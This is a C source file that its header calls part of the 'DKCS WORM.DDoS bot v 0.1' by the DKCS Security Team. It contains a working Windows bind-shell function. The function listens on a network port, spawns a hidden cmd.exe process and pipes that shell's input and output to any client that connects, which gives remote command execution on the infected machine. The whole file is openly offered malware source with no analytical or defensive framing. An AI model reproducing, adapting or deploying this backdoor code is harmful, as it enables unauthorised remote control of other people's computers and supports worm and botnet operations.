//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
#define USE_MINIMAL_SIZE
#define BUFSIZE				8192
#define SLEEP_TIME			500
//-----------------------------------------------------------------
DWORD WINAPI BindShell(LPVOID){
    
	register int		numbytes;
	int					val = 1;
	int					socklen;
	char				*membuf;
	SECURITY_ATTRIBUTES security_attributes;
	STARTUPINFO			startup_info;
	SOCKADDR_IN			serversin;
	SOCKADDR_IN			clientsin;	
	WSADATA				wsaData;
	HANDLE				StdOutputRead;
	HANDLE				StdOutputWrite;
	HANDLE				StdInputRead;
	HANDLE				StdInputWrite;
	
	SOCKET serverfd = INVALID_SOCKET, clientfd = INVALID_SOCKET;
	WSAStartup(MAKEWORD(1, 1), &wsaData);
	membuf = (char*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, BUFSIZE);
	serverfd = socket(AF_INET, SOCK_STREAM, 0);
	memset(&serversin, 0, sizeof(serversin));
	serversin.sin_family = AF_INET;
	serversin.sin_port = htons(MY_MACRO_BIND_PORT);
	setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, (const char *)&val, sizeof(val));
	bind(serverfd, (LPSOCKADDR)&serversin, sizeof(serversin));  
	listen(serverfd, 0);
	security_attributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	security_attributes.bInheritHandle = true;
	security_attributes.lpSecurityDescriptor = NULL;

start_server:
	CreatePipe(&StdOutputRead, &StdOutputWrite, &security_attributes, 0);
	CreatePipe(&StdInputRead, &StdInputWrite, &security_attributes, 0);
	GetStartupInfo(&startup_info);
	startup_info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	startup_info.wShowWindow = SW_HIDE;
	startup_info.hStdOutput = startup_info.hStdError = StdOutputWrite;
	startup_info.hStdInput = StdInputRead;
	CreateProcess(NULL, "cmd", NULL, NULL, true, 0, NULL, NULL, &startup_info, (PROCESS_INFORMATION *)&startup_info);
	CloseHandle(StdOutputWrite);
	CloseHandle(StdInputRead);

accept_new_client:
	socklen = sizeof(clientsin);
	clientfd = accept(serverfd, (LPSOCKADDR)&clientsin, &socklen);

get_cmd_data:
	Sleep(SLEEP_TIME);
	if(!PeekNamedPipe(StdOutputRead, NULL, 0, NULL, (DWORD *)&numbytes, 0)){
		goto accept_new_client;
	}
	if(numbytes == 0){
		goto get_client_data;
	}
	if(!ReadFile(StdOutputRead, membuf, BUFSIZE, (DWORD *)&numbytes, NULL)){
		goto accept_new_client;
	}
	if(send(clientfd, membuf, numbytes, 0) <= 0){
		#ifdef USE_MINIMAL_SIZE
			goto start_server;
		#else
			goto close_server;
		#endif
	}
	goto get_client_data;

get_client_data:
	numbytes = recv(clientfd, membuf, BUFSIZE, 0);
	if(numbytes <= 0){
		#ifdef USE_MINIMAL_SIZE
			goto start_server;
		#else
			goto close_server;
		#endif
	}
	if(!WriteFile(StdInputWrite, membuf, numbytes, (DWORD *)&numbytes, NULL)){
		#ifdef USE_MINIMAL_SIZE
			goto start_server;
		#else
			goto close_server;
		#endif
	}
	goto get_cmd_data;
#ifndef USE_MINIMAL_SIZE
close_server:
	closesocket(clientfd);
	CloseHandle(StdInputWrite);
	CloseHandle(StdOutputRead);
	goto start_server;
#endif
}
//-----------------------------------------------------------------